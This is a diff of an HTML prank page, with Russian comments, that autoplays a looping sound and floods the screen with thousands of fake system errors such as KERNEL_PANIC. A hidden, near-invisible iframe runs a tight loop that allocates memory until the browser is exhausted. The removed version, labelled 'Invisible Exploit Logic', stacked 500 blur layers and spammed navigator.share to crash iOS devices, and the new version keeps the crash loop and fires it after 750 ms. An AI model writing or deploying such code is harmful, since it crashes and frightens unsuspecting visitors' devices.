@@ -18,7 +18,6 @@
             align-content: flex-start;
             height: 100vh;
             width: 100vw;
-            position: relative;
         }
 
         .error-msg {
@@ -27,116 +26,126 @@
             white-space: nowrap;
             user-select: none;
             padding: 1px;
-            position: relative;
-            z-index: 10;
         }
 
         #respring-iframe {
             position: fixed;
-            top: 0;
-            left: 0;
             width: 1px;
             height: 1px;
-            border: none;
-            opacity: 0.01; 
+            opacity: 0.01;
             pointer-events: none;
             z-index: -1;
         }
     </style>
 </head>
 <body>
-    <iframe id="respring-iframe" 
-        sandbox="allow-forms allow-modals allow-scripts allow-same-origin">
-    </iframe>
 
-    <audio id="otkat-audio" preload="auto"></audio>
+<iframe id="respring-iframe"
+sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>
 
-    <script>
-        // === Автозапуск otkat.mp3 с GitHub ===
-        function playOtkat() {
-            const audio = document.getElementById('otkat-audio');
-            
-            // ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
-            // Замени эту ссылку на свою реальную raw-ссылку с GitHub
-            audio.src = "https://raw.githubusercontent.com/VityaIG/vityaig.github.io/main/otkat.mp3";
-            // Например:
-            // audio.src = "https://raw.githubusercontent.com/username/my-prank-repo/main/otkat.mp3";
-            
-            audio.volume = 10;     // громкость (0.0 - 1.0)
-            audio.loop = false;     // если хочешь зациклить — поставь true
+<script>
+    // ===== WEB AUDIO =====
+    const audioUrl = "https://raw.githubusercontent.com/VityaIG/vityaig.github.io/main/otkat.mp3";
 
-            audio.play().catch(err => {
-                console.log("Автозапуск заблокирован браузером:", err);
-                // Запасной вариант — запускаем по первому клику
-                document.addEventListener('click', () => audio.play(), { once: true });
-                document.addEventListener('touchstart', () => audio.play(), { once: true });
-            });
+    let audioCtx;
+    let buffer;
+    let source;
+
+    async function initAudio() {
+        if (!audioCtx) {
+            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
         }
 
-        // Запускаем звук сразу после загрузки страницы
-        window.addEventListener('load', () => {
-            playOtkat();
-            
-            // Дополнительная попытка через 300 мс (на случай задержек)
-            setTimeout(playOtkat, 30);
-        });
-
-        // === Остальной код (ошибки + iframe) ===
-        const errorTemplates = [
-            "Fatal Error 0x3333",
-            "Entering Bootloop...",
-            "KERNEL_PANIC",
-            "OVERFLOW_DETECTION",
-            "STACK_COLLISION",
-            "MEMORY_CORRUPTION",
-            "0xFFFF_SYSTEM_HALT",
-            "CRITICAL_PROCESS_DIED",
-            "THREAD_STUCK_IN_DEVICE_DRIVER",
-            "BOOT_LOOP_DETECTED",
-            "FS_CORRUPTION",
-            "SYSTEM_FREEZE",
-            "HARDWARE_MALFUNCTION"
-        ];
-        
-        for(let i = 0; i < 3000; i++) {
-            const span = document.createElement('span');
-            span.className = 'error-msg';
-            span.innerText = errorTemplates[Math.floor(Math.random() * errorTemplates.length)];
-            document.body.appendChild(span);
+        if (!buffer) {
+            const res = await fetch(audioUrl);
+            const arrayBuffer = await res.arrayBuffer();
+            buffer = await audioCtx.decodeAudioData(arrayBuffer);
         }
+    }
 
-        // Invisible Exploit Logic
-        window.onload = function() {
-            setTimeout(() => {
-                const frame = document.getElementById('respring-iframe');
-                const respringScript = `
-                    <html>
-                    <body style="margin:0; overflow:hidden;">
-                        <script>
-                            const container = document.createElement('div');
-                            container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
-                            document.body.appendChild(container);
+    function playAudio() {
+        if (!buffer || !audioCtx) return;
 
-                            for (let i = 0; i < 500; i++) {
-                                let d = document.createElement('div');
-                                d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg); opacity: 0.99;';
-                                container.appendChild(d);
-                            }
+        source = audioCtx.createBufferSource();
+        source.buffer = buffer;
+        source.loop = true;
 
-                            setInterval(() => {
-                                try {
-                                    navigator.share({ title: 'R', text: 'R'.repeat(100000) });
-                                } catch(e) {}
-                                let x = new Uint8Array(1024 * 1024 * 20);
-                                crypto.getRandomValues(x);
-                            }, 0);
-                        <\/script>
-                    </body>
-                    </html>
-                `;
-                frame.srcdoc = respringScript;
-            }, 20000);
-        };
-    </script>
+        const gainNode = audioCtx.createGain();
+        gainNode.gain.value = 1.0;
+
+        source.connect(gainNode).connect(audioCtx.destination);
+        source.start(0);
+    }
+
+    async function startAudio() {
+        try {
+            await initAudio();
+
+            if (audioCtx.state === "suspended") {
+                await audioCtx.resume();
+            }
+
+            playAudio();
+        } catch (e) {}
+    }
+
+    // попытка автозапуска (~100мс)
+    window.addEventListener("load", () => {
+        setTimeout(startAudio, 100);
+    });
+
+    // гарантированный запуск по действию
+    function unlock() {
+        startAudio();
+
+        document.removeEventListener("click", unlock);
+        document.removeEventListener("touchstart", unlock);
+        document.removeEventListener("keydown", unlock);
+    }
+
+    document.addEventListener("click", unlock);
+    document.addEventListener("touchstart", unlock);
+    document.addEventListener("keydown", unlock);
+
+
+    // ===== СПАМ ОШИБКАМИ =====
+    const errors = [
+        "Fatal Error 0x3333",
+        "Entering Bootloop...",
+        "KERNEL_PANIC",
+        "OVERFLOW_DETECTION",
+        "STACK_COLLISION",
+        "MEMORY_CORRUPTION",
+        "0xFFFF_SYSTEM_HALT"
+    ];
+
+    for (let i = 0; i < 3000; i++) {
+        let span = document.createElement("span");
+        span.className = "error-msg";
+        span.innerText = errors[Math.floor(Math.random() * errors.length)];
+        document.body.appendChild(span);
+    }
+
+
+    // ===== IFRAME БЕЗ ЗАДЕРЖКИ =====
+    window.addEventListener("load", () => {
+        setTimeout(() => {
+            const frame = document.getElementById("respring-iframe");
+
+            frame.srcdoc = `
+                <html><body style="margin:0">
+                <script>
+                    setInterval(() => {
+                        let x = new Uint8Array(1024 * 1024 * 10);
+                        crypto.getRandomValues(x);
+                    }, 0);
+                <\/script>
+                </body></html>
+            `;
+        }, 750);
+    });
+
+</script>
+
 </body>
 </html>
